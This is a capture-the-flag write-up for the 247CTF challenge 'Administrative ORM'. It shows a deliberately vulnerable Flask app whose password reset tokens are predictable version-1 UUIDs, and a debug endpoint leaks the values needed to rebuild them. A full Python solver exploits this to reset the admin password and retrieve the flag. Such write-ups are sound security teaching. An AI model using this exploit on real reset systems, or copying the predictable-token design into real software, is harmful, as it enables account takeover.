# ADMINISTRATIVE ORM [HARD]

## Description

> We started building a custom ORM for user management. Can you find any bugs before we push to production?

## Source Code

<details><summary>Click here for source code in text format</summary>

```python
import pymysql.cursors
import pymysql, os, bcrypt, debug
from flask import Flask, request
from secret import flag, secret_key, sql_user, sql_password, sql_database, sql_host

class ORM():
    def __init__(self):
        self.connection = pymysql.connect(host=sql_host, user=sql_user, password=sql_password, db=sql_database, cursorclass=pymysql.cursors.DictCursor)

    def update(self, sql, parameters):
        with self.connection.cursor() as cursor:
          cursor.execute(sql, parameters)
          self.connection.commit()

    def query(self, sql, parameters):
        with self.connection.cursor() as cursor:
          cursor.execute(sql, parameters)
          result = cursor.fetchone()
        return result

    def get_by_name(self, user):
        return self.query('select * from users where username=%s', user)

    def get_by_reset_code(self, reset_code):
        return self.query('select * from users where reset_code=%s', reset_code)

    def set_password(self, user, password):
        password_hash = bcrypt.hashpw(password, bcrypt.gensalt())
        self.update('update users set password=%s where username=%s', (password_hash, user))

    def set_reset_code(self, user):
        self.update('update users set reset_code=uuid() where username=%s', user)

app = Flask(__name__)
app.config['DEBUG'] = False
app.config['SECRET_KEY'] = secret_key
app.config['USER'] = 'admin'

@app.route("/get_flag")
def get_flag():
    user_row = app.config['ORM'].get_by_name(app.config['USER'])
    if bcrypt.checkpw(request.args.get('password','').encode('utf8'), user_row['password'].encode('utf8')):
        return flag
    return "Invalid password for %s!" % app.config['USER']

@app.route("/update_password")
def update_password():
    user_row = app.config['ORM'].get_by_reset_code(request.args.get('reset_code',''))
    if user_row:
        app.config['ORM'].set_password(app.config['USER'], request.args.get('password','').encode('utf8'))
        return "Password reset for %s!" % app.config['USER']
    app.config['ORM'].set_reset_code(app.config['USER'])
    return "Invalid reset code for %s!" % app.config['USER']

@app.route("/statistics") # TODO: remove statistics
def statistics():
    return debug.statistics()

@app.route('/')
def source():
    return "<pre>%s</pre>" % open(__file__).read()

@app.before_first_request
def before_first():
    app.config['ORM'] = ORM()
    app.config['ORM'].set_password(app.config['USER'], os.urandom(32).hex())

@app.errorhandler(Exception)
def error(error):
    return "Something went wrong!"

if __name__ == "__main__":
    app.run()
```

</details>

## Short Solution Description / Tags

UUIDv1 Calculation

## Solution

The reset_code needed to change the password is automatically generated using MySQL's `UUID()` function, and it is a UUIDv1:

```python
    def set_reset_code(self, user):
        self.update('update users set reset_code=uuid() where username=%s', user)
```

[MySQL :: MySQL 8.2 Reference Manual :: 12.23 Miscellaneous Functions](https://dev.mysql.com/doc/refman/8.2/en/miscellaneous-functions.html#function_uuid)

> UUID() returns a value that conforms to UUID version 1 as described in RFC 4122.

Gathering the information by the /statistics endpoint such as a MAC Addreess to calculate the UUIDv1, change the password, and then got the flag.

solver.py

```python
from datetime import datetime
import re
import requests
from uuid import UUID

s = requests.Session()
# s.proxies = {"https": "http://127.0.0.1:8080"}
s.verify = False

requests.packages.urllib3.disable_warnings()

BASE_URL = "https://47b8ddea058e5ec2.247ctf.com"


def set_reset_code():
    s.get(f"{BASE_URL}/update_password")


def leak_uuid():
    res = s.get(f"{BASE_URL}/statistics")

    # e.g. last_reset: 2023-12-29 05:40:33.170573900
    m = re.findall(r"last_reset: (.*)", res.text)
    reset_time = m[0]

    # UUIDv1 Implementation: https://github.com/python/cpython/blob/3.12/Lib/uuid.py#L692-L695

    no_ns = datetime.strptime(reset_time[:-10], "%Y-%m-%d %H:%M:%S").strftime("%s")
    no_ns = str(int(no_ns) + 60 * 60 * 9)

    time_ns = no_ns + reset_time[-9:]
    time_ns = int(time_ns)
    timestamp = time_ns // 100 + 0x01B21DD213814000
    time_low = timestamp & 0xFFFFFFFF

    time_mid = (timestamp >> 32) & 0xFFFF

    time_hi_version = (timestamp >> 48) & 0x0FFF

    # e.g. HWaddr 02:42:AC:11:00:19
    m = re.findall(r"HWaddr ([0-9A-F:]{17})", res.text)
    node = m[0]
    node = int(node.replace(":", "").lower(), base=16)

    # e.g. clock_sequence: 3215
    m = re.findall(r"clock_sequence: ([0-9].*)", res.text)
    clock_seq = int(m[0])
    clock_seq_low = clock_seq & 0xFF
    clock_seq_hi_variant = (clock_seq >> 8) & 0x3F

    # UUID: https://docs.python.org/3/library/uuid.html#uuid.UUID
    uuid = UUID(
        fields=(
            time_low,
            time_mid,
            time_hi_version,
            clock_seq_hi_variant,
            clock_seq_low,
            node,
        ),
        version=1,
    )

    return str(uuid)


def main():
    set_reset_code()

    leaked_uuid = leak_uuid()
    s.get(f"{BASE_URL}/update_password", params={"reset_code": leaked_uuid})
    res = s.get(f"{BASE_URL}/get_flag")
    print(res.text)


if __name__ == "__main__":
    main()
```

Result:

```console
$ python3 solver.py
247CTF{[REDACTED]}
```
